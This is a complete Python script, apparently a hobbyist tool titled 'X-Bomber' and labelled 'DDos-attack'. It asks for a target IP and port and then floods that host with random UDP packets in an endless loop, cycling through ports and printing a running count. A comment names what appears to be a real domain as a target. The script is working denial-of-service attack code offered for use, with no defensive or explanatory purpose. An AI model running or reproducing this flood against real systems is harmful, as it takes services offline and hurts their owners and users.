import sys
import os
import time
import socket
import random
from datetime import datetime
from colorama import init; init()
from termcolor import colored

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
print()
print(colored(''' DDos-attack
            __  __    ____                     _                        
            \ \/ / _ | __ )   ___   _ __ ___  | |__    ___  _ __        
      _____  \  / (_)|  _ \  / _ \ | '_ ` _ \ | '_ \  / _ \| '__| _____ 
     |_____| /  \  _ | |_) || (_) || | | | | || |_) ||  __/| |   |_____|
            /_/\_\(_)|____/  \___/ |_| |_| |_||_.__/  \___||_|          
                                                                        
                          
''', 'red'))
print
ip = input(" IP Target : ") #pdp.uz
port = int(input(" Port      : "))
sent = 0
while True:
     sock.sendto(bytes, (ip,port)) #8080
     sent = sent + 1
     port = port + 1
     print(colored("Sent %s packet to %s throught port:%s"%(sent,ip,port),'green'))
     
     if port == 65534:
       port = 1

